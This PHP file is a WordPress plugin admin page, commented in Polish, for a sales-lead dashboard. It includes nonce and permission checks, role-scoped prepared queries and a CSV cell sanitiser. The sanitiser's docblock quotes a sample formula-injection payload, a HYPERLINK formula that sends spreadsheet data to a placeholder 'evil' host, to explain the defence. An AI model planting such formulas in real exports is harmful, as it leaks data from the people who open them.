<?php
/**
 * Pulpit procesow sprzedazowych — podstrona panelu WordPressa.
 *
 * Podglad idzie sciezka `dashboard.view`: dzialy 1-2-3-9, bez zapisu. Lista
 * procesow bierze sie z tego samego jednego strzalu odczytu, ktory wykonuje
 * Dzial 2 — strona nie dokłada wlasnych zapytan poza samym wykazem procesow.
 *
 * @package MP_Sales_Workflow
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Podstrona pulpitu.
 */
class MP_SW_Admin {

	/** Slug podstrony. */
	const PAGE = 'mp-sales-workflow';

	/** Ile procesów pokazujemy na stronie. */
	const PER_PAGE = 25;

	/**
	 * Wpina podstronę.
	 *
	 * @return void
	 */
	public static function register() {
		add_action( 'admin_menu', array( __CLASS__, 'add_page' ) );
	}

	/**
	 * Dodaje pozycję w menu.
	 *
	 * @return void
	 */
	public static function add_page() {
		add_menu_page(
			__( 'Procesy sprzedażowe', 'mp-sales-workflow' ),
			__( 'Procesy sprzedażowe', 'mp-sales-workflow' ),
			MP_SW_Roles::CAP_HANDLE_EVENT,
			self::PAGE,
			array( __CLASS__, 'render' ),
			'dashicons-chart-line',
			27
		);
	}

	/**
	 * Rysuje stronę.
	 *
	 * @return void
	 */
	public static function render() {
		if ( ! current_user_can( MP_SW_Roles::CAP_HANDLE_EVENT ) ) {
			wp_die( esc_html__( 'Brak uprawnień do podglądu procesów sprzedażowych.', 'mp-sales-workflow' ) );
		}

		/*
		 * Bez nonce'a — świadomie. Podgląd niczego nie zapisuje, a token broni
		 * przed wymuszeniem AKCJI przez obcą witrynę; szczegóły przy krytyku K1.2.
		 * O dostępie decyduje uprawnienie, sprawdzone tuż wyżej i jeszcze raz w
		 * Dziale 1.
		 */
		$dispatched = MP_SW_Events::dispatch(
			MP_SW_Pipeline_Factory::EVENT_DASHBOARD_VIEW,
			array(
				'entity' => array(),
				'actor'  => array( 'user_id' => get_current_user_id() ),
			),
			MP_SW_D1::SOURCE_MANUAL
		);

		$context = $dispatched['context'];
		$scope   = (string) $context->get( 'scope', MP_SW_D3::SCOPE_OWN );
		$members = (array) $context->get( 'scope_members', array() );
		$rows    = self::flows( $scope, get_current_user_id(), $members );

		self::maybe_resume_queue();

		echo '<div class="wrap">';
		echo '<h1>' . esc_html__( 'Procesy sprzedażowe', 'mp-sales-workflow' ) . '</h1>';

		// Akcja wykonywana jest PRZED narysowaniem tabeli, ale wykaz `$rows` wczytano
		// wcześniej — po zmianie statusu trzeba go odświeżyć, inaczej pulpit
		// pokazałby stan sprzed operacji, którą użytkownik właśnie wykonał.
		if ( self::maybe_change_status() ) {
			$rows = self::flows( $scope, get_current_user_id(), $members );
		}

		if ( ! $dispatched['result']->is_ok() ) {
			echo '<div class="notice notice-error"><p>'
				. esc_html( implode( ' ', (array) $dispatched['result']->get_errors() ) )
				. '</p></div>';
		}

		self::render_summary( $context, $scope );
		self::render_table( $rows );
		self::render_journal( $rows );

		echo '</div>';
	}

	/**
	 * Zmiana statusu procesu z pulpitu — jedyna droga, którą handlowiec prowadzi
	 * sprzedaż bez wchodzenia w bazę.
	 *
	 * Formularz nie używa JavaScriptu: zwykły POST na tę samą podstronę. Wysyłka
	 * przez `admin-ajax.php` wymagałaby skryptu, a ten musiałby i tak przekazać
	 * ten sam token i to samo uprawnienie — bez żadnego zysku, za to z jednym
	 * dodatkowym miejscem, w którym coś może pójść nie tak.
	 *
	 * Token jest JEDEN i sprawdzany DWA razy: tutaj przez `check_admin_referer()`
	 * i jeszcze raz w Dziale 1, który dostaje go w kopercie. Nie generujemy tokenu
	 * po stronie serwera „na potrzeby pipeline'u" — wtedy pipeline weryfikowałby
	 * coś, co sam przed chwilą wystawił, czyli nic.
	 *
	 * @return bool Czy operacja została wykonana (niezależnie od jej wyniku).
	 */
	private static function maybe_change_status() {
		// phpcs:ignore WordPress.Security.NonceVerification.Missing -- nonce sprawdzany niżej.
		if ( ! isset( $_POST['mp_sw_action'] ) || 'change_status' !== $_POST['mp_sw_action'] ) {
			return false;
		}

		check_admin_referer( MP_SW_D1::NONCE_ACTION, 'mp_sw_nonce' );

		if ( ! current_user_can( MP_SW_Roles::CAP_CHANGE_STATUS ) ) {
			wp_die( esc_html__( 'Brak uprawnień do zmiany statusu procesu.', 'mp-sales-workflow' ) );
		}

		// phpcs:disable WordPress.Security.NonceVerification.Missing -- nonce sprawdzony wyżej.
		$lead_id   = isset( $_POST['lead_id'] ) ? absint( wp_unslash( $_POST['lead_id'] ) ) : 0;
		$to_status = isset( $_POST['to_status'] ) ? sanitize_text_field( wp_unslash( $_POST['to_status'] ) ) : '';
		$nonce     = isset( $_POST['mp_sw_nonce'] ) ? sanitize_text_field( wp_unslash( $_POST['mp_sw_nonce'] ) ) : '';
		// phpcs:enable WordPress.Security.NonceVerification.Missing

		if ( $lead_id < 1 || '' === $to_status ) {
			return false;
		}

		$dispatched = MP_SW_Events::from_http(
			MP_SW_Pipeline_Factory::EVENT_STATUS_CHANGE,
			array(
				'entity'    => array( 'lead_id' => $lead_id ),
				'actor'     => array( 'user_id' => get_current_user_id() ),
				'to_status' => $to_status,
				'nonce'     => $nonce,

				/*
				 * Klucz wyprowadzony z (proces, status docelowy, minuta), a nie losowy:
				 * odświeżenie strony po zmianie statusu wysyła ten sam formularz drugi
				 * raz, a rejestr zdarzeń odbija powtórkę zamiast wysłać klientowi
				 * drugą ofertę.
				 */
				'event_id'  => MP_SW_Events::derive_event_id(
					'dashboard.status',
					array( $lead_id, $to_status, (int) floor( time() / MINUTE_IN_SECONDS ) )
				),
			)
		);

		$result = $dispatched['result'];

		if ( $result->is_ok() ) {
			echo '<div class="notice notice-success is-dismissible"><p>'
				. esc_html__( 'Status procesu zmieniony.', 'mp-sales-workflow' )
				. '</p></div>';

			return true;
		}

		// Krytyk zwraca kod WEWNĘTRZNY (`unresolved_markers`), a słownik komunikatów
		// zna wyłącznie kody publiczne — bez tego tłumaczenia każda odmowa
		// wyglądała na pulpicie jak błąd wewnętrzny MP3-E500.
		$kod = MP_SW_Errors::code( $result->get_code() );

		/*
		 * Kod jest PODPISANY, a nie doklejony. Wcześniej za zdaniem po polsku stało
		 * gołe `MP3-Exxx` bez słowa wyjaśnienia — dla człowieka wyglądało to na
		 * usterkę samego komunikatu albo na wyciek czegoś wewnętrznego. Kod jest
		 * przydatny, tylko trzeba powiedzieć, po co go pokazujemy.
		 */
		echo '<div class="notice notice-error is-dismissible"><p>'
			. esc_html( MP_SW_Errors::message( $kod ) )
			. '</p><p class="description">'
			. esc_html__( 'Kod do zgłoszenia awarii:', 'mp-sales-workflow' )
			. ' <code>' . esc_html( $kod ) . '</code>'
			. '</p></div>';

		return true;
	}

	/**
	 * Wznowienie kolejki po zadziałaniu bezpiecznika.
	 *
	 * To JEDYNA akcja zmieniająca stan na tej podstronie, więc ma własny nonce
	 * (`check_admin_referer`) i własne uprawnienie. Podgląd nonce'a nie wymaga —
	 * niczego nie zapisuje — ale akcja już tak: bez tokenu wystarczyłoby, żeby
	 * administrator odwiedził obcą stronę z ukrytym obrazkiem wskazującym ten
	 * adres, a kolejka wznowiłaby się w chwili, w której właśnie ją zatrzymano.
	 *
	 * @return void
	 */
	private static function maybe_resume_queue() {
		// phpcs:ignore WordPress.Security.NonceVerification.Recommended -- nonce sprawdzany niżej.
		if ( ! isset( $_GET['mp_sw_action'] ) || 'resume_queue' !== $_GET['mp_sw_action'] ) {
			return;
		}

		check_admin_referer( 'mp_sw_resume_queue' );

		if ( ! current_user_can( MP_SW_Roles::CAP_MANAGE_SETTINGS ) ) {
			wp_die( esc_html__( 'Brak uprawnień do wznowienia kolejki.', 'mp-sales-workflow' ) );
		}

		MP_SW_Mailer::resume();

		echo '<div class="notice notice-success"><p>'
			. esc_html__( 'Kolejka powiadomień wznowiona.', 'mp-sales-workflow' )
			. '</p></div>';
	}

	/**
	 * Pasek podsumowania.
	 *
	 * @param MP_SW_Context $context Kontekst przebiegu.
	 * @param string        $scope   Zakres widoczności.
	 * @return void
	 */
	private static function render_summary( MP_SW_Context $context, $scope ) {
		$etykiety = array(
			MP_SW_D3::SCOPE_ALL  => __( 'wszystkie procesy', 'mp-sales-workflow' ),
			MP_SW_D3::SCOPE_TEAM => __( 'procesy zespołu', 'mp-sales-workflow' ),
			MP_SW_D3::SCOPE_OWN  => __( 'własne procesy', 'mp-sales-workflow' ),
		);

		echo '<p class="description">';
		printf(
			/* translators: 1: zakres widoczności, 2: liczba powiadomień w kolejce. */
			esc_html__( 'Zakres: %1$s · w kolejce powiadomień: %2$d', 'mp-sales-workflow' ),
			esc_html( isset( $etykiety[ $scope ] ) ? $etykiety[ $scope ] : $scope ),
			(int) MP_SW_Queue::pending()
		);
		echo '</p>';

		if ( MP_SW_Mailer::halted() ) {
			$link = wp_nonce_url(
				add_query_arg(
					array(
						'page'         => self::PAGE,
						'mp_sw_action' => 'resume_queue',
					),
					admin_url( 'admin.php' )
				),
				'mp_sw_resume_queue'
			);

			echo '<div class="notice notice-error"><p>'
				. esc_html__( 'Bezpiecznik zatrzymał kolejkę powiadomień — sprawdź źródło zdarzeń przed wznowieniem.', 'mp-sales-workflow' );

			if ( current_user_can( MP_SW_Roles::CAP_MANAGE_SETTINGS ) ) {
				echo ' <a href="' . esc_url( $link ) . '">' . esc_html__( 'Wznów kolejkę', 'mp-sales-workflow' ) . '</a>';
			}

			echo '</p></div>';
		}

		if ( $context->get_db_writes() > 0 ) {
			// Widoczne ostrzeżenie zamiast cichego przejścia: podgląd, który
			// cokolwiek zapisał, łamie założenie ścieżki dashboard.view.
			echo '<div class="notice notice-warning"><p>'
				. esc_html__( 'Uwaga: podgląd wykonał zapis do bazy — to nie powinno się zdarzyć.', 'mp-sales-workflow' )
				. '</p></div>';
		}
	}

	/**
	 * Tabela procesów.
	 *
	 * @param array $rows Wiersze procesów.
	 * @return void
	 */
	private static function render_table( array $rows ) {
		if ( empty( $rows ) ) {
			echo '<p>' . esc_html__( 'Brak procesów do wyświetlenia.', 'mp-sales-workflow' ) . '</p>';
			return;
		}

		echo '<table class="wp-list-table widefat fixed striped"><thead><tr>';

		$naglowki = array(
			__( 'Lead', 'mp-sales-workflow' ),
			__( 'Klient', 'mp-sales-workflow' ),
			__( 'Status', 'mp-sales-workflow' ),
			__( 'Handlowiec', 'mp-sales-workflow' ),
			__( 'Termin SLA', 'mp-sales-workflow' ),
			__( 'Otwarte zadania', 'mp-sales-workflow' ),
			__( 'Aktualizacja', 'mp-sales-workflow' ),
		);

		if ( current_user_can( MP_SW_Roles::CAP_CHANGE_STATUS ) ) {
			$naglowki[] = __( 'Akcje', 'mp-sales-workflow' );
		}

		foreach ( $naglowki as $naglowek ) {
			echo '<th>' . esc_html( $naglowek ) . '</th>';
		}

		echo '</tr></thead><tbody>';

		foreach ( $rows as $row ) {
			$owner = $row['assigned_user_id'] ? get_userdata( (int) $row['assigned_user_id'] ) : null;
			$link  = add_query_arg(
				array(
					'page'        => self::PAGE,
					'mp_sw_dzien' => (int) $row['id'],
				),
				admin_url( 'admin.php' )
			);

			echo '<tr>';
			echo '<td><a href="' . esc_url( $link ) . '">' . esc_html( $row['lead_id'] ) . '</a></td>';
			echo '<td>' . esc_html( '' !== (string) $row['client_name'] ? $row['client_name'] : '—' ) . '</td>';
			echo '<td>' . esc_html( self::status_label( (string) $row['status'] ) ) . '</td>';
			echo '<td>' . esc_html( $owner instanceof WP_User ? $owner->display_name : '—' ) . '</td>';
			echo '<td>' . esc_html( $row['sla_due_at'] ? $row['sla_due_at'] : '—' ) . '</td>';
			echo '<td>' . esc_html( $row['open_tasks'] ) . '</td>';
			echo '<td>' . esc_html( $row['updated_at'] ) . '</td>';

			if ( current_user_can( MP_SW_Roles::CAP_CHANGE_STATUS ) ) {
				echo '<td>';
				self::render_actions( $row );
				echo '</td>';
			}

			echo '</tr>';
		}

		echo '</tbody></table>';
	}

	/**
	 * Formularz akcji dla jednego procesu.
	 *
	 * Lista statusów docelowych pochodzi z maszyny statusów, nie z osobnej listy w
	 * widoku — inaczej pulpit oferowałby przejścia, które Dział 5 i tak odrzuci,
	 * a użytkownik dowiadywałby się o tym dopiero po kliknięciu.
	 *
	 * @param array $row Wiersz procesu.
	 * @return void
	 */
	private static function render_actions( array $row ) {
		$status = (string) $row['status'];
		$mapa   = MP_SW_D5_Machine::transitions();
		$cele   = isset( $mapa[ $status ] ) ? (array) $mapa[ $status ] : array();

		if ( empty( $cele ) ) {
			echo '<span class="description">' . esc_html__( 'proces zamknięty', 'mp-sales-workflow' ) . '</span>';
			return;
		}

		echo '<form method="post" style="display:flex;gap:4px;align-items:center;flex-wrap:wrap">';
		wp_nonce_field( MP_SW_D1::NONCE_ACTION, 'mp_sw_nonce' );
		echo '<input type="hidden" name="mp_sw_action" value="change_status" />';
		echo '<input type="hidden" name="lead_id" value="' . esc_attr( (int) $row['lead_id'] ) . '" />';

		/*
		 * Krok 4 zlecenia („oferta trafia do handlowca do zatwierdzenia; po
		 * akceptacji system wysyła ją klientowi") to w tej maszynie przejście
		 * `oferta robocza → oferta wysłana`. Dostaje własny, nazwany przycisk,
		 * bo to jedyna akcja na tym pulpicie, która wysyła pocztę na zewnątrz —
		 * nie powinna wyglądać jak każda inna pozycja na liście.
		 */
		if ( MP_Sales_Workflow_DB::STATUS_OFFER_DRAFT === $status
			&& in_array( MP_Sales_Workflow_DB::STATUS_OFFER_SENT, $cele, true ) ) {
			echo '<button type="submit" name="to_status" class="button button-primary" value="'
				. esc_attr( MP_Sales_Workflow_DB::STATUS_OFFER_SENT ) . '">'
				. esc_html__( 'Zatwierdź i wyślij ofertę', 'mp-sales-workflow' )
				. '</button>';

			$cele = array_values( array_diff( $cele, array( MP_Sales_Workflow_DB::STATUS_OFFER_SENT ) ) );

			if ( empty( $cele ) ) {
				echo '</form>';
				return;
			}
		}

		echo '<select name="to_status">';

		foreach ( $cele as $cel ) {
			echo '<option value="' . esc_attr( $cel ) . '">' . esc_html( self::status_label( $cel ) ) . '</option>';
		}

		echo '</select>';
		echo '<button type="submit" class="button">' . esc_html__( 'Zmień', 'mp-sales-workflow' ) . '</button>';
		echo '</form>';
	}

	/**
	 * Dziennik jednego procesu — kryterium odbioru 5.5.
	 *
	 * Zakres sprawdzany jest przez PRZYNALEŻNOŚĆ do już pobranej listy procesów,
	 * a nie osobnym zapytaniem o uprawnienia. Lista przeszła już przez zakres
	 * roli z Działu 3, więc proces spoza niej po prostu w niej nie występuje —
	 * podstawienie cudzego identyfikatora w adresie nie ma czego pokazać i nie
	 * kosztuje ani jednego dodatkowego zapytania.
	 *
	 * @param array $rows Procesy widoczne dla użytkownika.
	 * @return void
	 */
	private static function render_journal( array $rows ) {
		// phpcs:ignore WordPress.Security.NonceVerification.Recommended -- podgląd, bez zapisu.
		$flow_id = isset( $_GET['mp_sw_dzien'] ) ? absint( wp_unslash( $_GET['mp_sw_dzien'] ) ) : 0;

		if ( $flow_id < 1 ) {
			return;
		}

		$widoczny = null;

		foreach ( $rows as $row ) {
			if ( (int) $row['id'] === $flow_id ) {
				$widoczny = $row;
			}
		}

		if ( null === $widoczny ) {
			echo '<div class="notice notice-error"><p>'
				. esc_html( MP_SW_Errors::message( MP_SW_Errors::E_NOT_FOUND ) )
				. '</p></div>';
			return;
		}

		global $wpdb;

		$tabela = MP_Sales_Workflow_DB::activity_table();
		$wpisy  = $wpdb->get_results( // phpcs:ignore WordPress.DB.DirectDatabaseQuery
			$wpdb->prepare(
				"SELECT action, entity_ref, old_value, new_value, actor_type, actor_id, created_at
				 FROM {$tabela} WHERE flow_id = %d ORDER BY id ASC LIMIT 200", // phpcs:ignore WordPress.DB.PreparedSQL.InterpolatedNotPrepared
				$flow_id
			),
			ARRAY_A
		);

		echo '<h2>';
		printf(
			/* translators: %s: identyfikator leada. */
			esc_html__( 'Dziennik procesu — lead %s', 'mp-sales-workflow' ),
			esc_html( (string) $widoczny['lead_id'] )
		);
		echo '</h2>';

		if ( empty( $wpisy ) ) {
			echo '<p>' . esc_html__( 'Brak wpisów w dzienniku tego procesu.', 'mp-sales-workflow' ) . '</p>';
			return;
		}

		echo '<table class="wp-list-table widefat fixed striped"><thead><tr>';

		foreach ( array( 'Kiedy (GMT)', 'Zdarzenie', 'Czego dotyczy', 'Było', 'Jest', 'Kto' ) as $naglowek ) {
			echo '<th>' . esc_html( $naglowek ) . '</th>';
		}

		echo '</tr></thead><tbody>';

		foreach ( $wpisy as $wpis ) {
			$kto = (string) $wpis['actor_type'];

			if ( 'user' === $kto && (int) $wpis['actor_id'] > 0 ) {
				$user = get_userdata( (int) $wpis['actor_id'] );
				$kto  = $user instanceof WP_User ? $user->display_name : $kto;
			}

			echo '<tr>';
			echo '<td>' . esc_html( (string) $wpis['created_at'] ) . '</td>';
			echo '<td><code>' . esc_html( (string) $wpis['action'] ) . '</code></td>';
			echo '<td>' . esc_html( '' !== (string) $wpis['entity_ref'] ? $wpis['entity_ref'] : '—' ) . '</td>';
			echo '<td>' . esc_html( '' !== (string) $wpis['old_value'] ? $wpis['old_value'] : '—' ) . '</td>';
			echo '<td>' . esc_html( '' !== (string) $wpis['new_value'] ? $wpis['new_value'] : '—' ) . '</td>';
			echo '<td>' . esc_html( $kto ) . '</td>';
			echo '</tr>';
		}

		echo '</tbody></table>';
	}

	/**
	 * Etykieta statusu po polsku.
	 *
	 * Baza trzyma klucze angielskie (decyzja klienta), a tłumaczenie należy do
	 * warstwy prezentacji — czyli tutaj.
	 *
	 * @param string $status Klucz statusu.
	 * @return string
	 */
	public static function status_label( $status ) {
		$labels = array(
			MP_Sales_Workflow_DB::STATUS_NEW         => __( 'nowy', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_ASSIGNED    => __( 'przypisany', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_OFFER_DRAFT => __( 'oferta robocza', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_OFFER_SENT  => __( 'oferta wysłana', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_NEGOTIATION => __( 'negocjacje', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_WON         => __( 'wygrany', 'mp-sales-workflow' ),
			MP_Sales_Workflow_DB::STATUS_LOST        => __( 'przegrany', 'mp-sales-workflow' ),
		);

		return isset( $labels[ $status ] ) ? $labels[ $status ] : $status;
	}

	/**
	 * Wykaz procesów widocznych dla użytkownika.
	 *
	 * @param string $scope   Zakres widoczności z Działu 3.
	 * @param int    $user_id Bieżący użytkownik.
	 * @param int[]  $members Skład zespołu ze snapshotu (zakres „zespół").
	 * @return array
	 */
	public static function flows( $scope, $user_id, array $members = array() ) {
		global $wpdb;

		$flow  = MP_Sales_Workflow_DB::flow_table();
		$tasks = MP_Sales_Workflow_DB::tasks_table();

		$sql = "SELECT f.*, ( SELECT COUNT(*) FROM {$tasks} t WHERE t.flow_id = f.id AND t.status = %s ) AS open_tasks
			FROM {$flow} f";

		$params = array( MP_SW_D6_Scheduler::STATUS_PENDING );

		/*
		 * Zakres tnie zapytanie, a nie wynik. Filtrowanie po pobraniu oznaczałoby,
		 * że cudze procesy i tak przeszły przez pamięć procesu PHP — a stąd blisko
		 * do wycieku w komunikacie błędu albo w eksporcie.
		 */
		if ( MP_SW_D3::SCOPE_TEAM === $scope ) {
			$ids = array_values( array_unique( array_map( 'intval', $members ) ) );

			// Zespół bez składu to nie jest powód, żeby pokazać wszystko —
			// zawężamy do samego aktora. Pusta lista w `IN ()` byłaby zresztą
			// błędem składni, a „bez WHERE" oznaczałoby widok całej firmy.
			if ( empty( $ids ) ) {
				$ids = array( (int) $user_id );
			}

			$sql   .= ' WHERE f.assigned_user_id IN ( ' . implode( ', ', array_fill( 0, count( $ids ), '%d' ) ) . ' )';
			$params = array_merge( $params, $ids );
		} elseif ( MP_SW_D3::SCOPE_ALL !== $scope ) {
			$sql     .= ' WHERE f.assigned_user_id = %d';
			$params[] = (int) $user_id;
		}

		$sql     .= ' ORDER BY f.updated_at DESC LIMIT %d';
		$params[] = self::PER_PAGE;

		// phpcs:ignore WordPress.DB.PreparedSQL.NotPrepared, WordPress.DB.PreparedSQL.InterpolatedNotPrepared, WordPress.DB.DirectDatabaseQuery
		return (array) $wpdb->get_results( $wpdb->prepare( $sql, $params ), ARRAY_A );
	}

	/**
	 * Wartość komórki CSV bezpieczna dla arkusza kalkulacyjnego.
	 *
	 * Excel i LibreOffice traktują komórkę zaczynającą się od `=`, `+`, `-` albo
	 * `@` jako FORMUŁĘ i wykonują ją przy otwarciu pliku. Nazwa firmy wpisana w
	 * publiczny formularz LP.1 jako `=HYPERLINK("http://evil/?q="&A1)` zamienia
	 * eksport z panelu w wyciek danych na komputerze handlowca — a plik przeszedł
	 * przez zaufaną drogę, więc nikt go nie podejrzewa.
	 *
	 * Apostrof z przodu nie zmienia tekstu widocznego w arkuszu, ale wyłącza
	 * interpretację formuły.
	 *
	 * @param string $value Wartość.
	 * @return string
	 */
	public static function csv_cell( $value ) {
		$value = str_replace( array( "\r", "\n" ), ' ', (string) $value );

		if ( '' === $value ) {
			return $value;
		}

		return in_array( $value[0], array( '=', '+', '-', '@', "\t" ), true ) ? "'" . $value : $value;
	}
}
